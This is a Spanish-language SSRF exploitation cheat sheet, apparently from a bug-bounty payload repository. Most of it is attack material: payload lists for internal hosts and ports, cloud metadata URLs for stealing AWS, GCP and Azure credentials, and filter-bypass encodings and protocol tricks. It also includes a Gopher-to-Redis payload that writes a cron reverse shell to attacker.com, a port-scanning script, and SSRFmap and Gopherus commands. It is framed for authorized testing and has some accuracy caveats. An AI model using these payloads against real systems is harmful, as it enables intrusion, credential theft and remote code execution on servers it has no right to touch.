# 🌐 SSRF - Falsificación de solicitudes del lado del servidor

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Falsificación de solicitudes del lado del servidor
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Nube">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 🎯 Qué es SSRF

**SSRF** permite a un atacante hacer que el servidor envíe solicitudes a destinos no previstos, con la posibilidad de acceder a servicios internos o a metadatos de la nube.

### Impacto
- 🔴 **Acceso a la red interna** - Escanear servicios internos
- 🔴 **Metadatos de la nube** - Robar credenciales de AWS/GCP
- 🔴 **Eludir cortafuegos** - Acceder a recursos protegidos
- 🔴 **RCE** - En algunos casos permite ejecutar código

---

## 🔍 Dónde buscar

### Parámetros habituales
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Funciones vulnerables habituales
```
- Funciones que recuperan o validan URL
- Generadores de PDF
- Procesadores de imágenes
- Importaciones de archivos
- Webhooks
- Integraciones con API
- Extractores de contenido web
- Servicios de capturas de pantalla
```

---

## 💉 Payloads básicos

### Localhost
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Redes internas
```
# Clase A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Clase B
http://172.16.0.1
http://172.31.255.255

# Clase C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Enlace local (link-local)
http://169.254.169.254
```

### Puertos habituales
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # HTTP alternativo
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Metadatos de la nube

> **IMDS:** las URL de AWS mostradas corresponden a IMDSv1. Si la instancia exige IMDSv2, se requiere un token de sesión y las peticiones sin él fallan; véase la [documentación oficial de AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html). El acceso a metadatos no garantiza obtener credenciales: depende de la identidad y los permisos disponibles.

### AWS
```
# Metadatos de la instancia (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Datos concretos
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Con la cabecera necesaria
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Requiere una cabecera
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Técnicas de evasión

### Formatos de direcciones IP

> **Interpretación:** las representaciones alternativas dependen del analizador de URL y del cliente HTTP; no todas se aceptan ni resuelven al mismo destino. Por ejemplo, la forma octal que termina en cero no identifica necesariamente el mismo equipo que la terminada en uno.
```
# Decimal
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Hex
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Octal
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Formatos combinados
http://127.1
http://127.0.1
http://0
```

### Codificación URL
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Codificación doble
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS rebinding (cambio de la resolución DNS)

> **Distinción:** un nombre que resuelve de forma fija a una IP local no demuestra DNS rebinding. Esta técnica depende de cambios de resolución y del momento en que la aplicación valida y conecta. Véase la [guía SSRF de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
```
# Usar servicios como:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Configurar un DNS personalizado
your-domain.com → 127.0.0.1
```

### Problemas de interpretación de URL
```
# Truco de @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Fragmentos
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Barra invertida
http://attacker.com\127.0.0.1
```

### Uso de protocolos alternativos
```
# Archivo
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Cadena con redirección abierta
```
# Si el sitio tiene una redirección abierta:
https://target.com/redirect?url=http://169.254.169.254/

# Redirigir a un destino interno
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Evasión mediante IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Inyección de cabeceras
```
# Inyección CRLF en la URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Explotación

### RCE en Redis mediante Gopher

> **Ejemplo esquemático:** el bloque depende del soporte de Gopher, acceso a Redis, permisos de escritura y configuración del servicio. Sus saltos de línea y longitudes RESP deben corresponder exactamente a los datos transmitidos; no se presenta como un payload universal.
```
# Generar un payload
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Contrabando de solicitudes HTTP (request smuggling)

> **Precisión del título:** enviar HTTP mediante Gopher no demuestra por sí solo request smuggling; ese problema implica diferencias de interpretación entre componentes HTTP. El ejemplo también contiene una longitud declarada que no coincide con el cuerpo mostrado.
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Escaneo de puertos

> **Límite del script:** la ausencia del texto «connection refused» no confirma que un puerto esté abierto; proxies, errores y tiempos de espera pueden cambiar la respuesta. El ejemplo tampoco captura excepciones de red.
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Referencia rápida

### Detección
```
# Comprobar SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Comprobar la respuesta
- ¿Se recibió una consulta DNS?
- ¿Se recibió una solicitud HTTP?
- ¿La respuesta cambia para IP internas?
```

### Niveles de impacto

Los niveles de la tabla son orientativos; la severidad final depende del acceso y del impacto realmente demostrados.

| Objetivo | Impacto |
|--------|--------|
| Metadatos de la nube | Crítico: robo de credenciales |
| API internas | Alto: acceso a datos |
| Servicios internos | Alto: posible RCE |
| Escaneo de puertos | Medio: divulgación de información |

### Filtros y evasiones habituales

| Filtro | Evasión |
|--------|--------|
| Bloquear `localhost` | Usar `127.0.0.1`, `0`, `[::1]` |
| Bloquear `127.0.0.1` | Usar formato decimal `2130706433` |
| Bloquear IP privadas | Usar DNS rebinding |
| Solo HTTP | Probar `gopher://`, `file://` |
| Dominio en la lista de permitidos | Usar el truco de `@` o una redirección abierta |

---

## 🛠️ Herramientas

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (generador de payloads Gopher)
python gopherus.py --exploit redis

# Collaborator/webhook para SSRF ciego
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Recursos

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 ¡Explora la explotación de SSRF!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
